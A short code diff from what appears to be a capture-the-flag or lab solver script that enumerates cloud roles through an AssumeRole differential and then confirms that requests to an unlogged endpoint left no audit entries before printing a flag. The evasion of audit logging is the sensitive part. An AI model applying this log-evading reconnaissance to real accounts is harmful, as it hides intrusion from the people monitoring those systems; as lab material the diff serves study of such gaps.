@@ -37,9 +37,9 @@ def run():
             hits.append(name)
     log.append(f"[2] AssumeRole differential found existing roles: {hits}")
 
-    # 3. confirm the audit log has zero entries
-    logs = requests.get(f"{AUDIT}/logs", timeout=8).json()
-    log.append(f"[3] victim audit log entries: {logs['count']} (all recon was invisible)")
+    # 3. confirm the unlogged endpoint left no audit entries
+    logs = requests.get(f"{AUDIT}/logs", params={"path": "/api/unsupported"}, timeout=8).json()
+    log.append(f"[3] audit entries for /api/unsupported: {logs['count']} (recon was invisible)")
     log.append(f"FLAG: {FLAG}")
     return HTML.replace("{{out}}", "\n".join(log))
 
